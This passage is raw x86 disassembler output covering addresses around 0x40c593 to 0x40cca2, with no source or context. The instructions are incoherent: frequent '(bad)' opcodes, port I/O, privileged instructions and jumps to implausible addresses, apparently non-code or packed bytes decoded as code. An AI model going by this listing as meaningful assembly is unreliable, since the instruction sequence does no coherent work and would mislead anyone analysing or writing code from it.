  40c593:	mov    DWORD PTR [ecx-0x1afc2597],esi
  40c599:	lods   al,BYTE PTR ds:[esi]
  40c59a:	sbb    bh,BYTE PTR [edx+0x39]
  40c59d:	lods   al,BYTE PTR ds:[esi]
  40c59e:	add    BYTE PTR [edi+0x2cd6e5ac],ah
  40c5a4:	(bad)  
  40c5a5:	enter  0xf3ee,0xb
  40c5a9:	mov    es,WORD PTR [edi+0x268cb80e]
  40c5af:	inc    edx
  40c5b0:	push   cs
  40c5b1:	sahf   
  40c5b2:	pushf  
  40c5b3:	int3   
  40c5b4:	inc    eax
  40c5b5:	lds    ecx,FWORD PTR [ebx]
  40c5b7:	dec    eax
  40c5b8:	test   al,0xe6
  40c5ba:	jecxz  0x40c559
  40c5bc:	in     al,0x39
  40c5be:	sub    DWORD PTR [ebx+0x2c7c4e42],edx
  40c5c4:	lods   eax,DWORD PTR ds:[esi]
  40c5c5:	mov    WORD PTR [ebx-0x23],es
  40c5c8:	repnz and DWORD PTR [edx+0x53],edx
  40c5cc:	mov    ch,0xd2
  40c5ce:	cmc    
  40c5cf:	dec    ebx
  40c5d0:	cmp    al,0xc6
  40c5d2:	jp     0x40c5e1
  40c5d4:	mov    ecx,0x44614f4c
  40c5d9:	(bad)  
  40c5db:	je     0x40c56d
  40c5dd:	enter  0x1427,0x0
  40c5e1:	bound  edx,QWORD PTR [ebp+0x3d]
  40c5e4:	ficom  WORD PTR [eax-0x58fcbd9a]
  40c5ea:	mov    bh,0x99
  40c5ec:	jae    0x40c5cc
  40c5ee:	(bad)  
  40c5ef:	and    eax,0xfabecbe
  40c5f4:	(bad)  
  40c5f5:	lods   eax,DWORD PTR ds:[esi]
  40c5f6:	(bad)  
  40c5f7:	out    dx,eax
  40c5f8:	arpl   WORD PTR [ecx+0xd],ax
  40c5fb:	mov    esp,0xc7ed8afb
  40c600:	and    al,0x60
  40c602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c603:	sub    DWORD PTR [ebp+0x3b],0xd8b19107
  40c60a:	cmc    
  40c60b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c60c:	mov    ebp,0x3a800bf1
  40c611:	rep outs dx,DWORD PTR fs:[esi]
  40c614:	xchg   edx,eax
  40c615:	pop    esi
  40c616:	push   edi
  40c617:	fisubr DWORD PTR [edx-0x7c]
  40c61a:	xchg   ecx,eax
  40c61b:	fisubr DWORD PTR ss:[ebx]
  40c61e:	mov    ch,0x5c
  40c620:	or     eax,edx
  40c622:	and    DWORD PTR [edx],eax
  40c624:	stos   DWORD PTR es:[edi],eax
  40c625:	in     eax,dx
  40c626:	pop    ebx
  40c627:	xlat   BYTE PTR ds:[ebx]
  40c628:	jo     0x40c5f6
  40c62a:	cwde   
  40c62b:	cmp    BYTE PTR [edi-0x43],0x63
  40c62f:	inc    ecx
  40c630:	xchg   DWORD PTR [eax],esp
  40c632:	jno    0x40c5d7
  40c634:	mov    dl,0x45
  40c636:	sbb    BYTE PTR [esi-0x49f99d22],dh
  40c63c:	sbb    ch,bh
  40c63e:	pop    esi
  40c63f:	inc    esp
  40c640:	es or  bh,bh
  40c643:	and    eax,0xfe807267
  40c648:	jg     0x40c5d4
  40c64a:	or     DWORD PTR [ebp+0x38],ecx
  40c64d:	popf   
  40c64e:	stos   DWORD PTR es:[edi],eax
  40c64f:	inc    edi
  40c650:	scas   eax,DWORD PTR es:[edi]
  40c651:	shl    BYTE PTR [ebx+0x1c],cl
  40c654:	aas    
  40c655:	mov    ds,WORD PTR fs:[ebx+0x4d447356]
  40c65c:	aam    0x7a
  40c65e:	retf   0x6581
  40c661:	inc    ecx
  40c662:	retf   
  40c663:	adc    cl,BYTE PTR ds:0x5292c6a4
  40c669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c66a:	arpl   dx,di
  40c66c:	adc    ecx,DWORD PTR [esi+0x73926f51]
  40c672:	ret    0x33eb
  40c675:	pop    edx
  40c676:	or     BYTE PTR [eax],bh
  40c678:	add    eax,0x2dfa5cdd
  40c67d:	daa    
  40c67e:	inc    edx
  40c67f:	stos   BYTE PTR es:[edi],al
  40c680:	mov    WORD PTR [ebp+0x7f21d040],fs
  40c686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c687:	inc    ebx
  40c688:	fld    TBYTE PTR [esi]
  40c68a:	nop
  40c68b:	xor    edi,DWORD PTR [ecx+edx*4]
  40c68e:	fidiv  DWORD PTR [ecx-0x4e]
  40c691:	fmul   DWORD PTR [eax+0x4d]
  40c694:	sbb    bh,dl
  40c696:	das    
  40c697:	xchg   edi,eax
  40c698:	in     al,dx
  40c699:	ds push edi
  40c69b:	in     eax,dx
  40c69c:	sub    DWORD PTR [eax],edi
  40c69e:	cmp    DWORD PTR [ebx],0x5ce1ed3f
  40c6a4:	pop    ds
  40c6a5:	cld    
  40c6a6:	xor    eax,0xd4d20b37
  40c6ab:	pop    ss
  40c6ac:	lahf   
  40c6ad:	pop    es
  40c6ae:	loopne 0x40c71d
  40c6b0:	or     al,0x92
  40c6b2:	pop    ds
  40c6b3:	fwait
  40c6b4:	xor    ch,bl
  40c6b6:	mov    al,0x7
  40c6b8:	shl    BYTE PTR [edi+0x75],0x3f
  40c6bc:	jae    0x40c6d6
  40c6be:	int    0x18
  40c6c0:	repnz adc ebx,ebx
  40c6c3:	cmp    edi,0x2a
  40c6c6:	hlt    
  40c6c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6c8:	arpl   dx,ax
  40c6ca:	jne    0x40c6a4
  40c6cc:	scas   al,BYTE PTR es:[edi]
  40c6cd:	push   es
  40c6ce:	mov    bh,0xd2
  40c6d0:	add    BYTE PTR [ebp-0x5c],0x32
  40c6d4:	scas   eax,DWORD PTR es:[edi]
  40c6d5:	cld    
  40c6d6:	xchg   ebp,eax
  40c6d7:	jp     0x40c6b3
  40c6d9:	dec    ebx
  40c6da:	or     BYTE PTR [eax],0x3e
  40c6dd:	pop    ebx
  40c6de:	cmc    
  40c6df:	mov    WORD PTR [edi-0x41],gs
  40c6e2:	nop
  40c6e3:	push   ds
  40c6e4:	sbb    DWORD PTR [esi+eax*8-0x10bbcd91],ebx
  40c6eb:	xchg   ax,ax
  40c6ed:	dec    esi
  40c6ee:	and    DWORD PTR [esp+ebx*8+0x1bb6948],edi
  40c6f5:	push   0x452bfc62
  40c6fa:	lods   al,BYTE PTR ds:[esi]
  40c6fb:	dec    edi
  40c6fc:	(bad)  
  40c6fd:	xchg   esi,eax
  40c6fe:	into   
  40c6ff:	pop    edi
  40c700:	pusha  
  40c701:	adc    BYTE PTR [eax-0x52],0x7a
  40c705:	mov    cl,0x3
  40c707:	inc    BYTE PTR [ebx]
  40c709:	dec    edi
  40c70a:	and    al,0x45
  40c70c:	jbe    0x40c6f0
  40c70e:	clc    
  40c70f:	mov    ds:0xf2f97dd1,eax
  40c714:	mov    ch,0xd1
  40c716:	add    eax,0x6c3a0e99
  40c71b:	in     al,dx
  40c71c:	adc    eax,0xcf4ec83e
  40c721:	clc    
  40c722:	add    DWORD PTR [edi+0x25],eax
  40c725:	leave  
  40c726:	es adc esp,ebx
  40c729:	mov    WORD PTR [eax+0x344b2a6],di
  40c730:	sahf   
  40c731:	add    ah,ah
  40c733:	mov    cl,0x3f
  40c735:	sub    bh,0xa4
  40c738:	call   0x14500933
  40c73d:	shr    BYTE PTR [eax-0x47d9560c],cl
  40c743:	cmp    BYTE PTR ds:0x1c0bc249,ah
  40c749:	jge    0x40c6dc
  40c74b:	leave  
  40c74c:	add    BYTE PTR [ebp-0x5002d2b4],bh
  40c752:	iret   
  40c753:	mov    al,al
  40c755:	dec    ebp
  40c756:	sub    dl,BYTE PTR [esi]
  40c758:	loope  0x40c794
  40c75a:	add    al,0x5e
  40c75c:	pop    edx
  40c75d:	jbe    0x40c7ca
  40c75f:	fs xchg esi,eax
  40c761:	ss scas eax,DWORD PTR es:[edi]
  40c763:	dec    eax
  40c764:	fsub   DWORD PTR [edi]
  40c766:	mov    dl,0x3f
  40c768:	and    edi,DWORD PTR [ebx]
  40c76a:	das    
  40c76b:	sub    eax,0x5764f945
  40c770:	push   esi
  40c771:	mov    bh,0x2c
  40c773:	sbb    eax,0x59b038d2
  40c778:	test   BYTE PTR [esi+0x76],dh
  40c77b:	adc    ebx,ecx
  40c77d:	je     0x40c73d
  40c77f:	jl     0x40c75c
  40c781:	mov    al,ds:0x4d4b64d2
  40c786:	mov    edx,0x6dfa6921
  40c78b:	test   BYTE PTR [edi-0x2c],0xe1
  40c78f:	aad    0x8c
  40c791:	adc    DWORD PTR [ecx],ecx
  40c793:	repnz into 
  40c795:	cs or  al,0x75
  40c798:	dec    eax
  40c799:	xchg   esi,eax
  40c79a:	jecxz  0x40c7d9
  40c79c:	inc    ecx
  40c79d:	mov    dh,0xb8
  40c79f:	xor    DWORD PTR ss:[edi],ebp
  40c7a2:	loope  0x40c811
  40c7a4:	dec    ecx
  40c7a5:	sbb    al,0x43
  40c7a7:	ret    
  40c7a8:	xlat   BYTE PTR ds:[ebx]
  40c7a9:	adc    al,0xbd
  40c7ab:	xor    al,0xae
  40c7ad:	jmp    0xf3fc5eac
  40c7b2:	jmp    DWORD PTR [esp+edx*4]
  40c7b5:	mov    esp,esp
  40c7b7:	sub    eax,0x6a007f39
  40c7bc:	iret   
  40c7bd:	add    BYTE PTR [esi-0x11],bh
  40c7c0:	add    ebp,esp
  40c7c2:	loopne 0x40c7fb
  40c7c4:	mov    ch,bh
  40c7c6:	xlat   BYTE PTR ds:[ebx]
  40c7c7:	mov    bh,bl
  40c7c9:	inc    ebx
  40c7ca:	mov    bh,ah
  40c7cc:	gs (bad) 
  40c7ce:	ins    BYTE PTR es:[edi],dx
  40c7cf:	cmp    al,0x9f
  40c7d1:	pop    es
  40c7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7d3:	call   0xa78d7379
  40c7d8:	les    esi,FWORD PTR [ecx]
  40c7da:	enter  0x789f,0x85
  40c7de:	cdq    
  40c7df:	fs add al,0x32
  40c7e2:	mov    esp,edi
  40c7e4:	mov    ebp,0x2eaa8e2c
  40c7e9:	jno    0x40c7a2
  40c7eb:	enter  0x10b8,0x77
  40c7ef:	jns    0x40c7d8
  40c7f1:	sbb    BYTE PTR [edx+0x40],0x16
  40c7f5:	xchg   edx,eax
  40c7f6:	add    ebx,ebp
  40c7f8:	int3   
  40c7f9:	cmp    bh,BYTE PTR [eax+0x13c164b6]
  40c7ff:	aaa    
  40c800:	dec    ecx
  40c801:	add    dh,BYTE PTR [eax]
  40c803:	dec    edx
  40c804:	or     al,0x67
  40c806:	push   es
  40c807:	push   eax
  40c808:	dec    eax
  40c809:	mov    edi,0xd45055b8
  40c80e:	es ds popf 
  40c811:	push   ebx
  40c812:	xchg   edi,eax
  40c813:	icebp  
  40c814:	fst    QWORD PTR ds:0x600cb416
  40c81a:	xor    ebp,DWORD PTR [edi-0x50]
  40c81d:	int3   
  40c81e:	adc    edi,ebp
  40c820:	pop    ebx
  40c821:	mov    edx,0xc6669d20
  40c826:	xchg   BYTE PTR [edi-0x4f],al
  40c829:	inc    edi
  40c82a:	dec    edx
  40c82b:	mov    bh,0x90
  40c82d:	xchg   DWORD PTR [edi-0x72],ecx
  40c830:	dec    ecx
  40c831:	dec    ecx
  40c832:	xchg   esi,eax
  40c833:	xchg   ebx,eax
  40c834:	ja     0x40c858
  40c836:	lods   al,BYTE PTR ds:[esi]
  40c837:	lock push ebp
  40c839:	(bad)  
  40c83a:	scas   al,BYTE PTR es:[edi]
  40c83b:	add    BYTE PTR [edi+0x1332f8b1],0xa8
  40c842:	lods   al,BYTE PTR ds:[esi]
  40c843:	outs   dx,BYTE PTR ds:[esi]
  40c844:	pop    edi
  40c845:	scas   al,BYTE PTR es:[edi]
  40c846:	ror    DWORD PTR [eax-0x23],cl
  40c849:	xchg   DWORD PTR [edx-0x6107f0a],esp
  40c84f:	and    dh,BYTE PTR [edx-0x7d]
  40c852:	xchg   BYTE PTR [edi-0x6142f3dd],dh
  40c858:	int    0x46
  40c85a:	js     0x40c8c2
  40c85c:	push   esp
  40c85d:	xor    BYTE PTR ds:0x7d2b916e,bl
  40c863:	jns    0x40c7f8
  40c865:	retf   0xaa5
  40c868:	xchg   BYTE PTR ds:0xe77cc41a,ch
  40c86e:	test   eax,0x4f2c1df9
  40c873:	out    dx,eax
  40c874:	in     eax,dx
  40c875:	jmp    0xf274eb7f
  40c87a:	push   0x9a4cf279
  40c87f:	in     eax,0x7a
  40c881:	loopne 0x40c8a6
  40c883:	mov    edi,0xb623f18b
  40c888:	xchg   BYTE PTR [eax],cl
  40c88a:	add    edx,DWORD PTR [eax]
  40c88c:	push   edx
  40c88d:	leave  
  40c88e:	outs   dx,BYTE PTR ds:[esi]
  40c88f:	xlat   BYTE PTR ds:[ebx]
  40c891:	cwde   
  40c892:	sub    DWORD PTR [esi+0x8],edx
  40c895:	lods   eax,DWORD PTR ds:[esi]
  40c896:	jns    0x40c8a6
  40c898:	leave  
  40c899:	stos   DWORD PTR es:[edi],eax
  40c89a:	push   ebp
  40c89b:	inc    esp
  40c89c:	push   edi
  40c89d:	mov    ds:0xe01d0078,al
  40c8a2:	lods   eax,DWORD PTR ds:[esi]
  40c8a3:	clc    
  40c8a4:	dec    eax
  40c8a5:	add    cl,BYTE PTR [ebx-0x44]
  40c8a8:	mov    al,0x88
  40c8aa:	test   al,0xd0
  40c8ac:	or     BYTE PTR [edx+edi*8],bl
  40c8af:	mov    dl,0x1a
  40c8b1:	pop    ss
  40c8b2:	mov    ch,0x43
  40c8b4:	jmp    0xda8f9ddb
  40c8b9:	jne    0x40c895
  40c8bb:	push   ds
  40c8bc:	or     edx,DWORD PTR [ecx]
  40c8be:	pop    esp
  40c8bf:	out    dx,al
  40c8c0:	dec    edi
  40c8c1:	push   esp
  40c8c2:	test   eax,0x9a5fbbb5
  40c8c7:	mov    BYTE PTR [edi-0x468de49e],al
  40c8cd:	sub    ecx,eax
  40c8cf:	das    
  40c8d0:	imul   ecx,DWORD PTR [eax+0x6111bef7],0xffffffe5
  40c8d7:	je     0x40c8c0
  40c8d9:	mov    ebp,0x804cdc92
  40c8de:	mov    cl,0xa4
  40c8e0:	jns    0x40c903
  40c8e2:	mov    esp,0x3528ed76
  40c8e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8e8:	loope  0x40c938
  40c8ea:	lods   al,BYTE PTR ds:[esi]
  40c8eb:	into   
  40c8ec:	xor    esp,DWORD PTR [ecx+0x1f]
  40c8ef:	jnp    0x40c879
  40c8f1:	jnp    0x40c935
  40c8f3:	or     edi,ebx
  40c8f5:	mov    edx,0xc8d84ff2
  40c8fa:	sbb    BYTE PTR [edi],bh
  40c8fc:	xchg   ebp,eax
  40c8fd:	pusha  
  40c8fe:	and    ah,BYTE PTR ds:0x8d7182ba
  40c904:	cmp    BYTE PTR [ebx+0x84eae29],cl
  40c90a:	fmulp  st(0),st
  40c90c:	ins    DWORD PTR es:[edi],dx
  40c90d:	sbb    edx,esi
  40c90f:	mov    ebx,0x9ca463de
  40c914:	mov    edx,0xdd0831bd
  40c919:	pop    ebp
  40c91a:	outs   dx,DWORD PTR ds:[esi]
  40c91b:	xchg   ebp,eax
  40c91c:	pushf  
  40c91d:	xchg   ebp,eax
  40c91e:	adc    edx,DWORD PTR [ecx+0x4]
  40c921:	imul   ebx,esp,0x65
  40c924:	xor    DWORD PTR [edi+0x61],0xe
  40c928:	jae    0x40c917
  40c92a:	push   ss
  40c92b:	iret   
  40c92c:	shr    eax,0xa3
  40c92f:	inc    esp
  40c930:	mov    BYTE PTR [ebp+0x100f10e1],bl
  40c936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c937:	ret    
  40c938:	es dec esi
  40c93a:	es out dx,al
  40c93c:	adc    edi,DWORD PTR [ebx]
  40c93e:	sti    
  40c93f:	jge    0x40c8e1
  40c941:	or     al,0xc8
  40c943:	mov    ?,WORD PTR [ebx+0x6fa54dcc]
  40c949:	mov    esi,0xc6f5f27a
  40c94e:	adc    eax,0x1aa824e6
  40c953:	mov    esi,0x8967915d
  40c958:	scas   al,BYTE PTR es:[edi]
  40c959:	mov    al,ds:0x7b958f8b
  40c95e:	cwde   
  40c95f:	fdivr  st,st(5)
  40c961:	fwait
  40c962:	stos   BYTE PTR es:[edi],al
  40c963:	adc    al,0x92
  40c965:	ret    0xce62
  40c968:	in     al,0x3f
  40c96a:	mov    ds:0x668b011f,al
  40c96f:	nop
  40c970:	ins    BYTE PTR es:[edi],dx
  40c971:	add    al,0x8c
  40c973:	jnp    0x40c972
  40c975:	xor    BYTE PTR ds:0x37f4891b,bh
  40c97b:	daa    
  40c97c:	(bad)  
  40c97d:	mov    cl,0xb5
  40c97f:	stos   BYTE PTR es:[edi],al
  40c980:	inc    edi
  40c981:	sti    
  40c982:	scas   al,BYTE PTR es:[edi]
  40c983:	push   ds
  40c984:	iret   
  40c985:	push   eax
  40c986:	xor    DWORD PTR [ebx-0x333aeba7],0xde081dbb
  40c990:	xchg   esp,eax
  40c991:	adc    eax,0x871c9743
  40c996:	mov    edx,0x8c05540
  40c99b:	xchg   esp,eax
  40c99c:	add    ch,BYTE PTR [edx]
  40c99e:	shl    edx,0xc3
  40c9a1:	mul    DWORD PTR [ebx+0x44cc1127]
  40c9a7:	loopne 0x40ca15
  40c9a9:	rcl    ebx,1
  40c9ab:	add    eax,0xda9512b7
  40c9b0:	popf   
  40c9b1:	adc    ebp,ebx
  40c9b3:	and    BYTE PTR [ebp-0x1c188bbe],ah
  40c9b9:	call   FWORD PTR [edi+0xcdd018b]
  40c9bf:	inc    esp
  40c9c0:	ficomp WORD PTR [edx]
  40c9c2:	shl    ah,0x24
  40c9c5:	mov    ebp,0xf642515
  40c9ca:	dec    eax
  40c9cb:	repnz add DWORD PTR [esi],edi
  40c9ce:	xchg   esp,eax
  40c9cf:	inc    esp
  40c9d0:	adc    eax,DWORD PTR [edx+0x7d513708]
  40c9d6:	adc    al,0xe
  40c9d8:	push   ebp
  40c9d9:	xlat   BYTE PTR ds:[ebx]
  40c9da:	xor    BYTE PTR [edi-0x58afdcdc],ah
  40c9e0:	loopne 0x40ca0d
  40c9e2:	fnsave [edx]
  40c9e4:	add    edi,eax
  40c9e6:	mov    ch,0xf
  40c9e8:	xchg   ebx,eax
  40c9e9:	xchg   BYTE PTR [ebx+0xd],ah
  40c9ec:	cli    
  40c9ed:	lahf   
  40c9ee:	std    
  40c9ef:	xchg   esi,eax
  40c9f0:	rcl    DWORD PTR [eax+0x9],0xde
  40c9f4:	cdq    
  40c9f5:	or     al,BYTE PTR [eax+0x375844f3]
  40c9fb:	jns    0x40ca69
  40c9fd:	out    0xa2,al
  40c9ff:	mov    ch,0xc4
  40ca01:	add    al,0x80
  40ca03:	inc    eax
  40ca04:	pushf  
  40ca05:	sbb    eax,0xe601a65d
  40ca0a:	fdivr  QWORD PTR [esi+0x42]
  40ca0d:	retf   
  40ca0e:	adc    al,BYTE PTR [eax+0x53355661]
  40ca14:	push   ebp
  40ca15:	sbb    edx,DWORD PTR [ebp+0x38]
  40ca18:	pop    ecx
  40ca19:	pop    edx
  40ca1a:	fadd   DWORD PTR [edx-0x5]
  40ca1d:	frstor [ebx+0x20e56bc8]
  40ca23:	pop    es
  40ca24:	cmp    DWORD PTR [ecx],0x73
  40ca27:	mov    esi,DWORD PTR [esi+0x12c8fa6d]
  40ca2d:	fidivr DWORD PTR [ebx-0x52]
  40ca30:	aas    
  40ca31:	and    BYTE PTR [edx-0x7f],al
  40ca34:	pushf  
  40ca35:	daa    
  40ca36:	or     al,0x6c
  40ca38:	add    bl,bl
  40ca3a:	jl     0x40ca55
  40ca3c:	sbb    DWORD PTR [esi],esp
  40ca3e:	mov    edi,0x7b467974
  40ca43:	mov    al,0x1b
  40ca45:	aas    
  40ca46:	loope  0x40ca71
  40ca48:	cmp    DWORD PTR [ecx-0x1727e0a6],0xfffffffb
  40ca4f:	div    bl
  40ca51:	and    DWORD PTR [edi-0x2e],edx
  40ca54:	loop   0x40ca63
  40ca56:	scas   eax,DWORD PTR es:[edi]
  40ca57:	int    0xca
  40ca59:	or     ecx,esi
  40ca5b:	imul   DWORD PTR [ecx+esi*4-0x33]
  40ca5f:	ss js  0x40ca99
  40ca62:	fisttp QWORD PTR [ebx+0x7b6f4705]
  40ca68:	or     eax,0xdd146158
  40ca6d:	adc    esp,DWORD PTR [edx+0x1e15fc28]
  40ca73:	(bad)  
  40ca74:	dec    esi
  40ca75:	jle    0x40ca4f
  40ca77:	retf   0x2749
  40ca7a:	in     al,dx
  40ca7b:	mov    eax,ds:0x45e03af8
  40ca80:	sub    al,0xac
  40ca82:	mov    al,ds:0xc9bdb4f3
  40ca87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca88:	pop    eax
  40ca89:	(bad)  
  40ca8a:	lods   eax,DWORD PTR cs:[esi]
  40ca8c:	or     DWORD PTR [edi+esi*4+0x48],edx
  40ca90:	loope  0x40cacd
  40ca92:	outs   dx,BYTE PTR ds:[esi]
  40ca94:	pop    ebp
  40ca95:	enter  0xa31,0xe9
  40ca99:	inc    edx
  40ca9a:	add    edi,ebx
  40ca9c:	pop    ss
  40ca9d:	sar    DWORD PTR [edx-0x44a38984],1
  40caa3:	or     al,BYTE PTR [ecx-0x6d]
  40caa6:	in     eax,dx
  40caa7:	cmp    BYTE PTR [eax-0x30],bh
  40caaa:	outs   dx,DWORD PTR ds:[esi]
  40caab:	dec    esi
  40caac:	mov    eax,ds:0xdd9c0f73
  40cab1:	imul   DWORD PTR [ebx]
  40cab3:	mov    ecx,0xc78452c9
  40cab8:	xchg   ebp,eax
  40cab9:	jno    0x40cb12
  40cabb:	ss (bad) 
  40cabd:	sti    
  40cabe:	stos   DWORD PTR es:[edi],eax
  40cabf:	call   0x6dea:0x13807f5e
  40cac6:	push   esp
  40cac7:	leave  
  40cac8:	push   edx
  40cac9:	jae    0x40caf9
  40cacb:	jae    0x40ca5f
  40cacd:	xor    al,BYTE PTR [edx]
  40cacf:	pop    esi
  40cad0:	fsub   st(4),st
  40cad2:	sbb    al,0xa5
  40cad4:	in     eax,0x6f
  40cad6:	test   eax,0x16063437
  40cadb:	mov    cl,0xf8
  40cadd:	mov    cl,0xb0
  40cadf:	cmp    ebp,DWORD PTR [eax-0x19]
  40cae2:	not    BYTE PTR [eax-0x9ea6758]
  40cae8:	mov    eax,ds:0xd1325454
  40caed:	mov    ah,dl
  40caef:	or     BYTE PTR [ebx-0x7f],ch
  40caf2:	sbb    DWORD PTR [ebp+0x68],ecx
  40caf5:	jmp    0x40cb5d
  40caf7:	mov    ecx,0x11b11fb5
  40cafc:	push   0x26c90a87
  40cb01:	mov    al,0x54
  40cb03:	in     eax,dx
  40cb04:	xlat   BYTE PTR ds:[ebx]
  40cb05:	dec    ebp
  40cb06:	ret    
  40cb07:	cs inc esp
  40cb09:	rcr    DWORD PTR [esi+ebp*8],cl
  40cb0c:	dec    eax
  40cb0d:	push   ds
  40cb0e:	jns    0x40cb08
  40cb10:	sbb    bl,BYTE PTR [esi]
  40cb12:	retf   0x64df
  40cb15:	or     edi,DWORD PTR [ebp-0x6e]
  40cb18:	add    ch,al
  40cb1a:	pushf  
  40cb1b:	rcr    BYTE PTR ds:0x698ea96f,cl
  40cb21:	shr    BYTE PTR [esp+eax*1-0x47],0x3d
  40cb26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb27:	test   BYTE PTR [edi],dl
  40cb29:	out    0xb4,al
  40cb2b:	out    dx,al
  40cb2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb2d:	in     eax,0xae
  40cb2f:	inc    eax
  40cb30:	icebp  
  40cb31:	mov    dh,0x8d
  40cb33:	addr16 (bad) 
  40cb35:	call   0x20c125f9
  40cb3a:	sbb    DWORD PTR [edi+0x25ca133b],esp
  40cb40:	loop   0x40cb43
  40cb42:	imul   eax,ebp,0xffffffa6
  40cb45:	cmc    
  40cb46:	push   esi
  40cb47:	jg     0x40cae6
  40cb49:	dec    edx
  40cb4a:	into   
  40cb4b:	sbb    eax,0x755532bf
  40cb50:	add    eax,DWORD PTR [esi]
  40cb52:	push   edx
  40cb53:	cs retf 0xdd7
  40cb57:	andnps xmm1,xmm5
  40cb5a:	mov    eax,0xdec694a
  40cb5f:	sti    
  40cb60:	ins    BYTE PTR es:[edi],dx
  40cb61:	xor    al,0xf9
  40cb63:	mov    dl,0xb2
  40cb65:	xor    BYTE PTR [ebp-0x12],bl
  40cb68:	ja     0x40cb98
  40cb6a:	std    
  40cb6b:	ins    BYTE PTR es:[edi],dx
  40cb6c:	sub    DWORD PTR [ebx],0xffffff92
  40cb6f:	aas    
  40cb70:	dec    esp
  40cb71:	push   ss
  40cb72:	aaa    
  40cb73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb74:	sub    edi,esi
  40cb76:	loopne 0x40cb96
  40cb78:	jae    0x40cb04
  40cb7a:	out    dx,al
  40cb7b:	mov    dh,0x32
  40cb7d:	jo     0x40cb2d
  40cb7f:	sub    al,BYTE PTR [ebp-0x14]
  40cb82:	outs   dx,BYTE PTR ds:[esi]
  40cb83:	push   es
  40cb84:	inc    edx
  40cb85:	lds    ecx,FWORD PTR [ecx-0x3f]
  40cb88:	iret   
  40cb89:	xor    eax,0xbb70c553
  40cb8e:	add    al,0xbf
  40cb90:	arpl   WORD PTR [edx],bx
  40cb92:	mov    cl,0x1f
  40cb94:	es sbb al,0x50
  40cb97:	sbb    edi,DWORD PTR [ebx-0x7b]
  40cb9a:	pushf  
  40cb9b:	ds loopne 0x40cbdf
  40cb9e:	jns    0x40cb36
  40cba0:	aad    0xb1
  40cba2:	out    dx,eax
  40cba3:	shl    ebp,1
  40cba5:	aad    0xb7
  40cba7:	leave  
  40cba8:	and    DWORD PTR [esp+ebx*1],ebx
  40cbab:	cld    
  40cbac:	test   dl,ah
  40cbae:	push   ecx
  40cbaf:	push   ss
  40cbb0:	dec    esp
  40cbb1:	pusha  
  40cbb2:	jmp    FWORD PTR [eax-0x40]
  40cbb5:	mov    esp,0x745b93d4
  40cbba:	out    dx,al
  40cbbb:	cs dec esi
  40cbbd:	fild   QWORD PTR [esi-0x435f3f2a]
  40cbc3:	xchg   edx,eax
  40cbc4:	mov    ebp,0x3f98f6c3
  40cbc9:	ins    BYTE PTR es:[edi],dx
  40cbca:	sub    DWORD PTR [ecx],ebp
  40cbcc:	cmc    
  40cbcd:	or     ah,BYTE PTR [ebp-0x60baeacf]
  40cbd3:	xor    al,0xae
  40cbd5:	mov    bl,0x9e
  40cbd7:	bound  esp,QWORD PTR [bx+si+0x9]
  40cbdb:	cs aad 0x14
  40cbde:	inc    eax
  40cbdf:	jnp    0x40cbde
  40cbe1:	test   eax,ebp
  40cbe3:	dec    esi
  40cbe4:	push   DWORD PTR [eax-0x7868a2fe]
  40cbea:	dec    ebp
  40cbeb:	rol    BYTE PTR [edx+0x3c],1
  40cbee:	sub    eax,0xfb26f6a7
  40cbf3:	scas   eax,DWORD PTR es:[edi]
  40cbf4:	retf   
  40cbf5:	addr16 loope 0x40cbd1
  40cbf8:	dec    esi
  40cbf9:	rol    ebp,0x5a
  40cbfc:	sbb    ecx,ecx
  40cbfe:	sbb    eax,0xb1060219
  40cc03:	cmp    DWORD PTR [ebp-0x47047a04],esp
  40cc09:	jmp    0x40cc42
  40cc0b:	dec    bp
  40cc0d:	cmp    DWORD PTR [ebp+0x52e34afd],eax
  40cc13:	loop   0x40cc85
  40cc15:	mov    al,0x62
  40cc17:	cmp    DWORD PTR [edi-0x2f1d2242],eax
  40cc1d:	arpl   WORD PTR [edx],si
  40cc1f:	lock rcr al,cl
  40cc22:	mov    ah,0xf6
  40cc24:	adc    BYTE PTR [esi+edx*4-0x16b25119],ch
  40cc2b:	nop
  40cc2c:	inc    ebx
  40cc2d:	out    dx,al
  40cc2e:	loop   0x40cc18
  40cc30:	mov    edi,0x9f7ff438
  40cc35:	sbb    BYTE PTR [edx+ebp*1],0x1d
  40cc39:	lahf   
  40cc3a:	in     eax,dx
  40cc3b:	aad    0xf7
  40cc3d:	inc    ebp
  40cc3e:	arpl   WORD PTR [edi-0x538cd5cd],si
  40cc44:	rol    DWORD PTR [edi-0x6cf56361],cl
  40cc4a:	push   edi
  40cc4b:	jecxz  0x40cca1
  40cc4d:	or     esi,DWORD PTR [eax]
  40cc4f:	or     ah,BYTE PTR [eax-0x38]
  40cc52:	imul   edi,DWORD PTR [edx+eax*2],0xffffff9e
  40cc56:	mov    BYTE PTR [esi-0x7da7f1cd],0xc7
  40cc5d:	pop    edi
  40cc5e:	and    cl,bh
  40cc60:	xor    al,0x9b
  40cc62:	arpl   WORD PTR [edi+ebp*4+0x43],di
  40cc66:	ret    0xcd27
  40cc69:	imul   edx,DWORD PTR [esp+eax*8],0x37acf4ce
  40cc70:	in     eax,0x86
  40cc72:	mov    ds:0x4975a671,eax
  40cc77:	jno    0x40ccb3
  40cc79:	add    dl,BYTE PTR [eax-0x7d73ede8]
  40cc7f:	cmp    edx,DWORD PTR [esi+0x58f5f508]
  40cc85:	add    dh,BYTE PTR [ecx+0x2cb7f224]
  40cc8b:	xor    al,0xd4
  40cc8d:	fsubr  QWORD PTR [edi+0x14c42f4b]
  40cc93:	scas   al,BYTE PTR es:[edi]
  40cc94:	adc    eax,0x33862ab5
  40cc99:	enter  0x7679,0x56
  40cc9d:	dec    esi
  40cc9e:	aaa    
  40cc9f:	jo     0x40cd17
  40cca1:	xchg   ebx,eax
  40cca2:	xor    BYTE PTR [eax-0x5615d3e2],ch
